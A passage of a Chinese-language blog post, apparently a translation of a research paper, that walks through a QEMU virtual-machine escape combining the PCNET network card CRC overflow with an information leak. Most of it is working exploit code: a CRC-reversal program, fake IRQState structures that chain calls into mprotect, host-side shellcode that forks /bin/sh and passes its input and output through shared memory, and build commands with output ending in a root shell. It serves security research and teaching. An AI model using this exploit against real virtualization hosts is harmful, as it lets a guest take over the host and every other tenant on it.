buffer上的ADDFCS标志位是开启的，网卡会在收到的数据包后面添加一个CRC校验码，这个是在hw/net/pcnet.c里面的pcnet_receive()函数实现的。 收到的数据包小于（4096 - 4）个bytes是没有问题的，但是数据包刚好是4096个bytes，我们就可以溢出这个buffer 4个字节的大小了 1234567891011121314151617181920212223uint8_t *src = s-&gt;buffer;/* ... */if (!s-&gt;looptest) &#123; memcpy(src, buf, size); /* no need to compute the CRC */ src[size] = 0; src[size + 1] = 0; src[size + 2] = 0; src[size + 3] = 0; size += 4;&#125; else if (s-&gt;looptest == PCNET_LOOPTEST_CRC || !CSR_DXMTFCS(s) || size &lt; MIN_BUF_SIZE+4) &#123; uint32_t fcs = ~0; uint8_t *p = src; // 没到字符串结尾就不断调用CRC while (p != &amp;src[size]) CRC(fcs, *p++); //将CRC的结果放到字符串后面 *(uint32_t *)p = htonl(fcs); size += 4;&#125; 在上面的代码中s指向PCNET结构体，我们看看这个结构体，buffer后面就是irq，我们可以覆盖irq变量的值 12345678910111213141516171819202122struct PCNetState_st &#123; NICState *nic; NICConf conf; QEMUTimer *poll_timer; int rap, isr, lnkst; uint32_t rdra, tdra; uint8_t prom[16]; uint16_t csr[128]; uint16_t bcr[32]; int xmit_pos; uint64_t timer; MemoryRegion mmio; uint8_t buffer[4096]; qemu_irq irq; void (*phys_mem_read)(void *dma_opaque, hwaddr addr, uint8_t *buf, int len, int do_bswap); void (*phys_mem_write)(void *dma_opaque, hwaddr addr, uint8_t *buf, int len, int do_bswap); void *dma_opaque; int tx_busy; int looptest;&#125;; 变量irq是一个指IRQState结构体的指针，而这个指针里面第二是一个handler 12345678910typedef struct IRQState *qemu_irq;typedef void (*qemu_irq_handler)(void *opaque, int n, int level);struct IRQState &#123; Object parent_obj; qemu_irq_handler handler; void *opaque; int n;&#125;; 而这个handler会被PCNET网卡模拟器调用多次。比如，在pcnet_receive()的末尾，调用了pcnet_update_irq()，这个函数里面调用了qemu_set_irq()，在qemu_set_irq中就调用了irq中的handler 1234567void qemu_set_irq(qemu_irq irq, int level)&#123; if (!irq) return; irq-&gt;handler(irq-&gt;opaque, irq-&gt;n, level);&#125; 所以要利用这个漏洞，我们需要： 伪造一个假的IRQState结构体，比如里面包含指向system函数的handler 获得这个假的IRQState结构体的精确地址。有了之前的信息泄露，我们可以算出它在qemu进程的内存地址（这是在guest虚拟机的物理内存基址再加上一个偏移） 伪造一个4K的恶意数据包（即4096字节）. 修改数据包，使得计算出来的CRC刚好指向我们构造的假的IRQState结构体 最后就发送这个数据包即可 但PCNET网卡收到数据包，它会通过pcnet_receive函数处理执行以下操作： 复制收到的数据包到buffer变量 计算CRC并追加到buffer后面，那么就会溢出buffer4个bytes，覆盖了irq变量 调用 pcnet_update_irq()，里面再调用 qemu_set_irq() ，在里面就调用irq变量里面的handler，那么我我们的handler就会执行了 请注意，irq是我们伪造的，所以我们可以控制irq-&gt;handler的前两个参数 (irq-&gt;opaque and irq-&gt;n), 感谢一个小技巧，我们也可以控制第三个参数（level），这对于调用mprotect函数来说是必须的。 还需要注意的是我们是用4字节覆盖一个8字节的指针，覆盖的是低4字节，在我们的测试环境中我们可以成功控制rip寄存器。然而这会在没有在编译时设置CONFIG_ARCH_BINFMT_ELF_RANDOMIZE_PIE标志的内核上会出问题。 设置网卡在进一步研究之前，我们需要设置PCNET网卡需要的flags，Tx 和 Rx 描述缓冲区，还有环形缓冲区，以便能够发送和接收数据包。 AMD PCNET网卡可以以16位模式或者32位模式进行访问。这个取决于DWI0的值（这个值储存在网卡中），下面我们深入PCNET网卡在16位模式下的主要寄存器，因为16位模式网卡重置后的默认模式。 通过访问reset寄存器可以将卡重置为默认状态。 PCNET网卡有两种内部寄存器：CSR (Control and Status Register 控制和状态寄存器) and BCR (Bus Control Registers 总线控制寄存器)。两个寄存器都需要在RAP(Register Address Port) 寄存器设置我们要访问的寄存器索引才能访问。比如我们想初始化并重启网卡，我们需要将CSR0的bit0和bit1设置为1，这个我们可以通过写入0到RAP寄存器去选择CSR0，之后设置CSR为0x3，(即二进制的0b11),如下面代码所示： 12outw(0x0, PCNET_PORT + RAP);outw(0x3, PCNET_PORT + RDP); 网卡的配置可以通过初始化一个下面的结构体之后传递这个结构体的物理地址给网卡（需要通过CSR1和CSR2寄存器完成） 12345678910struct pcnet_config &#123; uint16_t mode; /* working mode: promiscusous, looptest, etc. */ uint8_t rlen; /* number of rx descriptors in log2 base */ uint8_t tlen; /* number of tx descriptors in log2 base */ uint8_t mac[6]; /* mac address */ uint16_t _reserved; uint8_t ladr[8]; /* logical address filter */ uint32_t rx_desc; /* physical address of rx descriptor buffer */ uint32_t tx_desc; /* physical address of tx descriptor buffer */&#125;; 逆向CRC就像前面所说的，我们需要填充数据包，使得计算出来的CRC能够指向我们伪造的IRQState结构体。 幸运的是，CRC是可逆的，只需要打一个4字节的补丁即可让他设置成我们想要设置的任何值 下面的源码reverse-crc.c，打了一个4字节的补丁，使得CRC计算出来是0xdeadbeef 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123---[ reverse-crc.c ]---#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#define CRC(crc, ch) (crc = (crc &gt;&gt; 8) ^ crctab[(crc ^ (ch)) &amp; 0xff])/* generated using the AUTODIN II polynomial * x^32 + x^26 + x^23 + x^22 + x^16 + * x^12 + x^11 + x^10 + x^8 + x^7 + x^5 + x^4 + x^2 + x^1 + 1 */static const uint32_t crctab[256] = &#123; 0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419, 0x706af48f, 0xe963a535, 0x9e6495a3, 0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988, 0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91, 0x1db71064, 0x6ab020f2, 0xf3b97148, 0x84be41de, 0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7, 0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec, 0x14015c4f, 0x63066cd9, 0xfa0f3d63, 0x8d080df5, 0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172, 0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b, 0x35b5a8fa, 0x42b2986c, 0xdbbbc9d6, 0xacbcf940, 0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59, 0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423, 0xcfba9599, 0xb8bda50f, 0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924, 0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d, 0x76dc4190, 0x01db7106, 0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433, 0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818, 0x7f6a0dbb, 0x086d3d2d, 0x91646c97, 0xe6635c01, 0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e, 0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457, 0x65b0d9c6, 0x12b7e950, 0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65, 0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2, 0x4adfa541, 0x3dd895d7, 0xa4d1c46d, 0xd3d6f4fb, 0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0, 0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9, 0x5005713c, 0x270241aa, 0xbe0b1010, 0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f, 0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17, 0x2eb40d81, 0xb7bd5c3b, 0xc0ba6cad, 0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a, 0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683, 0xe3630b12, 0x94643b84, 0x0d6d6a3e, 0x7a6a5aa8, 0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1, 0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb, 0x196c3671, 0x6e6b06e7, 0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc, 0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5, 0xd6d6a3e8, 0xa1d1937e, 0x38d8c2c4, 0x4fdff252, 0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b, 0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55, 0x316e8eef, 0x4669be79, 0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236, 0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f, 0xc5ba3bbe, 0xb2bd0b28, 0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d, 0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a, 0x9c0906a9, 0xeb0e363f, 0x72076785, 0x05005713, 0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38, 0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21, 0x86d3d2d4, 0xf1d4e242, 0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777, 0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c, 0x8f659eff, 0xf862ae69, 0x616bffd3, 0x166ccf45, 0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2, 0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db, 0xaed16a4a, 0xd9d65adc, 0x40df0b66, 0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9, 0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605, 0xcdd70693, 0x54de5729, 0x23d967bf, 0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94, 0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d,&#125;;uint32_t crc_compute(uint8_t *buffer, size_t size)&#123; uint32_t fcs = ~0; uint8_t *p = buffer; while (p != &amp;buffer[size]) CRC(fcs, *p++); return fcs;&#125;uint32_t crc_reverse(uint32_t current, uint32_t target)&#123; size_t i = 0, j; uint8_t *ptr; uint32_t workspace[2] = &#123; current, target &#125;; for (i = 0; i &lt; 2; i++) workspace[i] &amp;= (uint32_t)~0; ptr = (uint8_t *)(workspace + 1); for (i = 0; i &lt; 4; i++) &#123; j = 0; while(crctab[j] &gt;&gt; 24 != *(ptr + 3 - i)) j++; *((uint32_t *)(ptr - i)) ^= crctab[j]; *(ptr - i - 1) ^= j; &#125; return *(uint32_t *)(ptr - 4);&#125;int main()&#123; uint32_t fcs; uint32_t buffer[2] = &#123; 0xcafecafe &#125;; uint8_t *ptr = (uint8_t *)buffer; fcs = crc_compute(ptr, 4); printf(\"[+] current crc = %010p, required crc = \\n\", fcs); fcs = crc_reverse(fcs, 0xdeadbeef); printf(\"[+] applying patch = %010p\\n\", fcs); buffer[1] = fcs; fcs = crc_compute(ptr, 8); if (fcs == 0xdeadbeef) printf(\"[+] crc patched successfully\\n\");&#125; 漏洞利用漏洞利用首先将网卡设置为默认模式，之后配置Tx和Rx描述缓冲区，最后初始化网卡，重启网卡使设置生效 之后就是发一个触发堆溢出漏洞的数据包，如下所示，qemu_set_irq调用了一个损坏的irq-&gt;handler地址——0x7f66deadbeef。qemu就会崩溃，因为那是一个非法的地址。 123456789(gdb) shell ps -e | grep qemu 8335 pts/4 00:00:03 qemu-system-x86(gdb) attach 8335...(gdb) cContinuing.Program received signal SIGSEGV, Segmentation fault.0x00007f669ce6c363 in qemu_set_irq (irq=0x7f66deadbeef, level=0)43 irq-&gt;handler(irq-&gt;opaque, irq-&gt;n, level); 这是我实践的截图，由于要取irq的handler的值，由于irq是0x5555deadbf1f，这个地址是不可读的，所以崩溃了 将上面两个漏洞结合起来实现完整利用这一小节，结合前两个漏洞进行虚拟机逃逸，并使用qemu的权限在主机上执行代码 首先，我们使用CVE-2015-5165来重构qemu的内存布局（其实就是信息泄露），更确切地说，是获得下面的一些地址以绕过ASLR保护： guest虚拟机的物理内存基址，在漏洞利用中，我们需要在虚拟机里面申请分配一些内存，获得这个内存在qemu虚拟地址空间的精确地址 .text 段的基址，这可以让我们获得qemu_set_irq()函数的地址 .plt段的基址，这可以让我们知道一些函数的地址，比如fork()和execv()函数，他们可以用来构建我们的shellcode。我们mprotect() 函数来改变guest虚拟机的物理地址的权限——记住，分配给guest虚拟机的“物理地址”是不可执行的（即qemu的mmap出来的地址）。 控制RIP在上面我们是可以控制rip寄存器的。假如我们想不然qemu崩溃，我们得溢出PCNET网卡的buffer使得irq结构指向一个我们伪造的IRQState，那就会call我们想调用的函数了。 首先，我们可能会尝试构建一个假的IRQState结构去调用system函数，然而这会失败，因为一些qemu映射的内存fork之后不能使用这段内存，更确切的说是mmap的物理内存有MADV_DONTFORK标记。（具体可以看这里http://man7.org/linux/man-pages/man2/madvise.2.html ， 搜索MADV_DONTFORK关键字） 1qemu_madvise(new_block-&gt;host, new_block-&gt;max_length, QEMU_MADV_DONTFORK); 调用execv()也是没用的，因为这样我们会是去对guest虚拟机的控制权 还有一种想法是我们可以构造一种shellcode——将几个假的IRQState连起来去调用多个函数，因为PCNET网卡模拟器或调用好几次qemu_set_irq()。然而我们发现这样子更方便更可靠——我们先开启shellcode所在内存页的PROT_EXEC标志，之后再执行shellcode。 我们现在的想法是构造两个假的IRQState结构。第一个结构用于调用mprotect()，第二个就用于调用shellcode——这个shellcode首先撤销MADV_DONTFORK标志，之后执行一个在guest虚拟机和主机之间可交互的shell。 如前所述，但qemu_set_irq()被调用，它有两个参数——irq (指向 IRQstate 的结构体) 和 level (IRQ level)，之后如下所示调用handler： 1234567void qemu_set_irq(qemu_irq irq, int level)&#123; if (!irq) return; irq-&gt;handler(irq-&gt;opaque, irq-&gt;n, level);&#125; 如上，我们只能控制前两个参数，那么有三个参数的mprotect()，我们如何调用呢？ 为了解决这个问题，我们使qemu_set_irq()调用自身，其中参数如下：（其实就是将handler设置为qemu_set_irq函数的地址，我们即可控制level，这操作牛逼） irq: 指向假的IRQState，其中handler指针指向mprotect()函数 level: mprotect的flag设置为： PROT_READ | PROT_WRITE | PROT_EXEC 这是通过设置两个假的IRQState来实现的，代码片段如下： 12345678910111213141516171819struct IRQState &#123; uint8_t _nothing[44]; uint64_t handler; uint64_t arg_1; int32_t arg_2;&#125;;struct IRQState fake_irq[2];hptr_t fake_irq_mem = gva_to_hva(fake_irq);/* do qemu_set_irq */fake_irq[0].handler = qemu_set_irq_addr;fake_irq[0].arg_1 = fake_irq_mem + sizeof(struct IRQState);fake_irq[0].arg_2 = PROT_READ | PROT_WRITE | PROT_EXEC;/* do mprotect */fake_irq[1].handler = mprotec_addrt;fake_irq[1].arg_1 = (fake_irq_mem &gt;&gt; PAGE_SHIFT) &lt;&lt; PAGE_SHIFT;fake_irq[1].arg_2 = PAGE_SIZE; 那么现在，就是溢出后，qemu_set_irq()调用了一个fake handler，而这个handler就是qemu_set_irq()自身，这可以将level参数设置为7，而这个是mprotect说需要的，那么之后就是调用mprotect函数了。 内存现在是可执行的了，我们可以通过将第一个IRQState的handler指向我们的shellcode地址，之后就可以将控制权交给我们的交互式shell。 payload.fake_irq[0].handler = shellcode_addr;payload.fake_irq[0].arg_1 = shellcode_data; 交互式shell我们可以写一个基础的shellcode——在shell绑定到netcat的某个端口上，之后通过其他计算机连接这个shell。这是一个满意的解决方案，但是我们最好能够规避防火墙。我们可以利用guest虚拟机和主机之间的共享内存来构建一个bindshell。 利用qemu的漏洞有一点微妙，我们在guest虚拟机写的代码，在qemu进程的内存中是可用的。所以我们不用注入shellcode，我们可以共享代码，使它在guest虚拟机运行，之后攻击host主机。 下面总结了在host主机和guest虚拟机之间的共享内存和进程，线程。 我们创建两个共享的环形buffer（in和out）并提供通过自旋锁访问这些共享内存区域读/写的原语。在host主机上，我们运行一段shellcode——运行一个 /bin/sh 的shell，并且复制它的 stdin 和 stdout 文件描述符。我们创建两个线程，第一个从共享内存读取命令并通过管道传递给shell，第二个线程读取shell的输出（从第二个管道读），之后将他们写到共享内存。 guest虚拟机也有两个线程，第一个线程将用户输入的命令写到共享内存上，第二个线程从共享内存中读取到的输出stdout 请注意，在我们的exp中，我们有第三个线程（还有一个专用的共享内存）来处理stderr的输出 下面其实看图更加清晰： VM-Escape Exploit在这一小节，我们概述完整exp（vm-escape.c）的主要结构和函数。 注入的payload由下面的结构体定义： 1234567struct payload &#123; struct IRQState fake_irq[2]; struct shared_data shared_data; uint8_t shellcode[1024]; uint8_t pipe_fd2r[1024]; uint8_t pipe_r2fd[1024];&#125;; 上面的fake_irq是一对假的IRQState结构体，目的是调用mprotect()去改变我们paylaod所在页面的保护为可读可写可执行。 结构体shared_data是用于将参数传递给主shellcode的。 1234567struct shared_data &#123; struct GOT got; uint8_t shell[64]; hptr_t addr; struct shared_io shared_io; volatile int done;&#125;; got结构体充当全局偏移表（Global Offset Table，即GOT表），它包含了shellcode所需的主要函数的地址，这些地址是我们是通过信息泄露获得的。 123456789101112131415struct GOT &#123; typeof(open) *open; typeof(close) *close; typeof(read) *read; typeof(write) *write; typeof(dup2) *dup2; typeof(pipe) *pipe; typeof(fork) *fork; typeof(execv) *execv; typeof(malloc) *malloc; typeof(madvise) *madvise; typeof(pthread_create) *pthread_create; typeof(pipe_r2fd) *pipe_r2fd; typeof(pipe_fd2r) *pipe_fd2r;&#125;; 主shellcode是由下面的结构体定义的： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475/* main code to run after %rip control */void shellcode(struct shared_data *shared_data)&#123; pthread_t t_in, t_out, t_err; int in_fds[2], out_fds[2], err_fds[2]; struct brwpipe *in, *out, *err; char *args[2] = &#123; shared_data-&gt;shell, NULL &#125;; // 判断shared_data-&gt;done，避免shellcode函数运行多次 if (shared_data-&gt;done) &#123; return; &#125; // 设置shared_data-&gt;addr为MADV_DOFORK，即去除MADV_DONTFORK标记 shared_data-&gt;got.madvise((uint64_t *)shared_data-&gt;addr, PHY_RAM, MADV_DOFORK); //创建三个管道，分别是输入，输出和错误的 shared_data-&gt;got.pipe(in_fds); shared_data-&gt;got.pipe(out_fds); shared_data-&gt;got.pipe(err_fds); //申请内存 in = shared_data-&gt;got.malloc(sizeof(struct brwpipe)); out = shared_data-&gt;got.malloc(sizeof(struct brwpipe)); err = shared_data-&gt;got.malloc(sizeof(struct brwpipe)); //给brwpipe传递数据 in-&gt;got = &amp;shared_data-&gt;got; out-&gt;got = &amp;shared_data-&gt;got; err-&gt;got = &amp;shared_data-&gt;got; in-&gt;fd = in_fds[1]; out-&gt;fd = out_fds[0]; err-&gt;fd = err_fds[0]; in-&gt;ring = &amp;shared_data-&gt;shared_io.in; out-&gt;ring = &amp;shared_data-&gt;shared_io.out; err-&gt;ring = &amp;shared_data-&gt;shared_io.err; if (shared_data-&gt;got.fork() == 0) &#123; // 子进程 // 关闭in_fds的输出，out_fds和err_fds的输入 //之后就是分别复制到0，1，2 //最后执行shellcode shared_data-&gt;got.close(in_fds[1]); shared_data-&gt;got.close(out_fds[0]); shared_data-&gt;got.close(err_fds[0]); shared_data-&gt;got.dup2(in_fds[0], 0); shared_data-&gt;got.dup2(out_fds[1], 1); shared_data-&gt;got.dup2(err_fds[1], 2); //那么shell的执行标准输入、标准输出和标准错误分别对应in_fds[0]，out_fds[1]，err_fds[1] shared_data-&gt;got.execv(shared_data-&gt;shell, args); &#125; else &#123; // 父进程，与子进程的close刚好相反 shared_data-&gt;got.close(in_fds[0]); shared_data-&gt;got.close(out_fds[1]); shared_data-&gt;got.close(err_fds[1]); //创建三个线程 //从共享内存读，之后写到in-&gt;fd，即 in_fds[1] shared_data-&gt;got.pthread_create(&amp;t_in, NULL, shared_data-&gt;got.pipe_r2fd, in); //从out-&gt;fd（即out_fds[0]）读，之后写到共享内存 shared_data-&gt;got.pthread_create(&amp;t_out, NULL, shared_data-&gt;got.pipe_fd2r, out); //从err-&gt;fd读（即err_fds[0]），之后写到共享内存 shared_data-&gt;got.pthread_create(&amp;t_err, NULL, shared_data-&gt;got.pipe_fd2r, err); //设置shared_data-&gt;done为1 shared_data-&gt;done = 1; &#125;&#125; 上面的shellcode()函数首先检查一下 shared_data-&gt;done，避免shellcode()函数执行多次（因为qemu_set_irq会被qemu代码调用多次，而qemu_set_irq又会调用shellcode函数） shellcode()函数之后调用madvise()函数这是撤销shared_data-&gt;addr pointing的MADV_DONTFORK标志，这可以确保fork之后内存映射还是可用的。 shellcode()函数接下来是创建了一个子进程——就是启动一个shell(“/bin/sh”)。父进程则启动了3个线程，到共享内存区域将shell命令从guest虚拟机传递到host主机，之后将这些命令执行结果的输出给回guest虚拟机。父进程与子进程的通信则通过管道来通信。 如下所示，共享内存区域包含一个环形缓冲区，可以通过sm_read() 和 sm_write()原语进行访问。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283struct shared_ring_buf &#123; volatile bool lock; bool empty; uint8_t head; uint8_t tail; uint8_t buf[SHARED_BUFFER_SIZE];&#125;;static inline__attribute__((always_inline))ssize_t sm_read(struct GOT *got, struct shared_ring_buf *ring, char *out, ssize_t len)&#123; ssize_t read = 0, available = 0; do &#123; /* spin lock */ while (__atomic_test_and_set(&amp;ring-&gt;lock, __ATOMIC_RELAXED)); if (ring-&gt;head &gt; ring-&gt;tail) &#123; // loop on ring available = SHARED_BUFFER_SIZE - ring-&gt;head; &#125; else &#123; available = ring-&gt;tail - ring-&gt;head; if (available == 0 &amp;&amp; !ring-&gt;empty) &#123; available = SHARED_BUFFER_SIZE - ring-&gt;head; &#125; &#125; available = MIN(len - read, available); imemcpy(out, ring-&gt;buf + ring-&gt;head, available); read += available; out += available; ring-&gt;head += available; if (ring-&gt;head == SHARED_BUFFER_SIZE) ring-&gt;head = 0; if (available != 0 &amp;&amp; ring-&gt;head == ring-&gt;tail) ring-&gt;empty = true; __atomic_clear(&amp;ring-&gt;lock, __ATOMIC_RELAXED); &#125; while (available != 0 || read == 0); return read;&#125;static inline__attribute__((always_inline))ssize_t sm_write(struct GOT *got, struct shared_ring_buf *ring, char *in, ssize_t len)&#123; ssize_t written = 0, available = 0; do &#123; /* spin lock */ while (__atomic_test_and_set(&amp;ring-&gt;lock, __ATOMIC_RELAXED)); if (ring-&gt;tail &gt; ring-&gt;head) &#123; // loop on ring available = SHARED_BUFFER_SIZE - ring-&gt;tail; &#125; else &#123; available = ring-&gt;head - ring-&gt;tail; if (available == 0 &amp;&amp; ring-&gt;empty) &#123; available = SHARED_BUFFER_SIZE - ring-&gt;tail; &#125; &#125; available = MIN(len - written, available); imemcpy(ring-&gt;buf + ring-&gt;tail, in, available); written += available; in += available; ring-&gt;tail += available; if (ring-&gt;tail == SHARED_BUFFER_SIZE) ring-&gt;tail = 0; if (available != 0) ring-&gt;empty = false; __atomic_clear(&amp;ring-&gt;lock, __ATOMIC_RELAXED); &#125; while (written != len); return written;&#125; 上面的两个原语是由下面的线程函数使用的。第一个是从共享内存区域读取数据，然后写到一个文件描述符中。第二个的话是从文件描述符中读取，然后写到共享内存区域 These primitives are used by the following threads function. The first onereads data from a shared memory area and writes it to a file descriptor.The second one reads data from a file descriptor and writes it to a sharedmemory area. 1234567891011121314151617181920212223242526272829303132void *pipe_r2fd(void *_brwpipe)&#123; struct brwpipe *brwpipe = (struct brwpipe *)_brwpipe; char buf[SHARED_BUFFER_SIZE]; ssize_t len; while (true) &#123; len = sm_read(brwpipe-&gt;got, brwpipe-&gt;ring, buf, sizeof(buf)); if (len &gt; 0) brwpipe-&gt;got-&gt;write(brwpipe-&gt;fd, buf, len); &#125; return NULL;&#125; SHELLCODE(pipe_r2fd)void *pipe_fd2r(void *_brwpipe)&#123; struct brwpipe *brwpipe = (struct brwpipe *)_brwpipe; char buf[SHARED_BUFFER_SIZE]; ssize_t len; while (true) &#123; len = brwpipe-&gt;got-&gt;read(brwpipe-&gt;fd, buf, sizeof(buf)); if (len &lt; 0) &#123; return NULL; &#125; else if (len &gt; 0) &#123; len = sm_write(brwpipe-&gt;got, brwpipe-&gt;ring, buf, len); &#125; &#125; return NULL;&#125; 注意代码里面的这些函数是共享于host主机和guest虚拟机。这些线程也在guest虚拟机实例化，读取用户输入的命令，之后复制他们专用的共享内存区域（in这个变量的共享内存区域）。还有将命令的输出写到共享内存区域（out和err这两个变量共享内存） 12345678910111213141516171819202122232425262728293031323334353637void session(struct shared_io *shared_io)&#123; size_t len; pthread_t t_in, t_out, t_err; struct GOT got; struct brwpipe *in, *out, *err; got.read = &amp;read; got.write = &amp;write; warnx(&quot;[!] enjoy your shell&quot;); fputs(COLOR_SHELL, stderr); in = malloc(sizeof(struct brwpipe)); out = malloc(sizeof(struct brwpipe)); err = malloc(sizeof(struct brwpipe)); in-&gt;got = &amp;got; out-&gt;got = &amp;got; err-&gt;got = &amp;got; in-&gt;fd = STDIN_FILENO; out-&gt;fd = STDOUT_FILENO; err-&gt;fd = STDERR_FILENO; in-&gt;ring = &amp;shared_io-&gt;in; out-&gt;ring = &amp;shared_io-&gt;out; err-&gt;ring = &amp;shared_io-&gt;err; pthread_create(&amp;t_in, NULL, pipe_fd2r, in); pthread_create(&amp;t_out, NULL, pipe_r2fd, out); pthread_create(&amp;t_err, NULL, pipe_r2fd, err); pthread_join(t_in, NULL); pthread_join(t_out, NULL); pthread_join(t_err, NULL);&#125; 上面我们讨论说明了共享内存，在guest和host里面运行的进程/线程。 这个exploit作者使用了gcc 4.9.2进行编译。未来适应特定的qemu，作者提供了一个shell脚本（build-exploit.sh）来输出一个qemu.h头文件，其实获得的是各种我们需要的函数什么的偏移。 使用方法如下 1$ ./build-exploit &lt;path-to-qemu-binary&gt; &gt; qemu.h 编译直接-o会出错，得加个-pthread 1gcc vm-escape.c -pthread -o vm-escape Running the full exploit (vm-escape.c) will result in the following output: 12345678910111213$ ./vm-escape$ exploit: [+] found 190 potential ObjectProperty structs in memory $ exploit: [+] .text mapped at 0x7fb6c55c3620$ exploit: [+] mprotect mapped at 0x7fb6c55c0f10$ exploit: [+] qemu_set_irq mapped at 0x7fb6c5795347$ exploit: [+] VM physical memory mapped at 0x7fb630000000$ exploit: [+] payload at 0x7fb6a8913000$ exploit: [+] patching packet ...$ exploit: [+] running first attack stage$ exploit: [+] running shellcode at 0x7fb6a89132d0$ exploit: [!] enjoy your shell$ shell &gt; id$ uid=0(root) gid=0(root) ... 由于我的实验环境的内核编译的时候应该没有加入CONFIG_ARCH_BINFMT_ELF_RANDOMIZE_PIE这个选项，所以irq指针是在qemu的堆里面，而不在qemu给guest所mmap出来的内存里面，而我们又只能溢出4个字节，所以只能失败 局限性请注意，目前的漏洞利用仍然是不可靠的。在测试环境中（Debian 7 running a 3.16 kernel on x_86_64 arch），10次中大概有1次是失败的。在大多数失败的情况中，exp不能重构qemu的内存布局，因为泄露的数据是不可用的（其实就是泄露的数据不靠谱，导致计算出的其他函数的地址是错误的） 同样exploit也不适用于内核编译没有加入CONFIG_ARCH_BINFMT_ELF_RANDOMIZE_PIE标志的。这种情况下，qemu二进制程序（默认加入-fPIE进行编译）会映射到单独的内存地址空间中，如下所示： 1234567891011121314151617181955e5e3fdd000-55e5e4594000 r-xp 00000000 fe:01 6940407 [qemu-system-x86_64]55e5e4794000-55e5e4862000 r--p 005b7000 fe:01 6940407 ...55e5e4862000-55e5e48e3000 rw-p 00685000 fe:01 6940407 ...55e5e48e3000-55e5e4d71000 rw-p 00000000 00:00 0 55e5e6156000-55e5e7931000 rw-p 00000000 00:00 0 [heap]7fb80b4f5000-7fb80c000000 rw-p 00000000 00:00 0 7fb80c000000-7fb88c000000 rw-p 00000000 00:00 0 [2 GB of RAM] 7fb88c000000-7fb88c915000 rw-p 00000000 00:00 0 ...7fb89b6a0000-7fb89b6cb000 r-xp 00000000 fe:01 794385 [first shared lib]7fb89b6cb000-7fb89b8cb000 ---p 0002b000 fe:01 794385 ...7fb89b8cb000-7fb89b8cc000 r--p 0002b000 fe:01 794385 ...7fb89b8cc000-7fb89b8cd000 rw-p 0002c000 fe:01 794385 ... ...7ffd8f8f8000-7ffd8f91a000 rw-p 00000000 00:00 0 [stack]7ffd8f970000-7ffd8f972000 r--p 00000000 00:00 0 [vvar]7ffd8f972000-7ffd8f974000 r-xp 00000000 00:00 0 [vdso]ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall] 因此，我们的4字节溢出不足以覆盖irq指针（因为地址在0x55xxxxxxxxxx处的堆中）指向我们假的IRQState结构，而IRQState结构在0x7fxxxxxxxxxx 总结在本文中，我们展示了QEMU的网络设备模拟器的两个漏洞。 这些漏洞利用的结合使得突破VM并在主机上执行代码成为可能。 在这项工作中，我们可能会crash我们的测试VM1000次。 调试不成功的漏洞利用会很繁琐，特别是，使用复杂的shellcode函数去多进程，而一个进程又启动多个线程。因此，我们希望已经提供了足够的技术细节以及可以重复用于进一步利用QEMU的通用技术。 感谢原作者的感谢的话我就不贴出来了 实验源码下面文章的Source Code部分有uuencode编码的内容，将begin…end之间拷贝到一个文件——命名为666.txt(你喜欢什么名字都可以) 执行命令 uudecode 666.txt 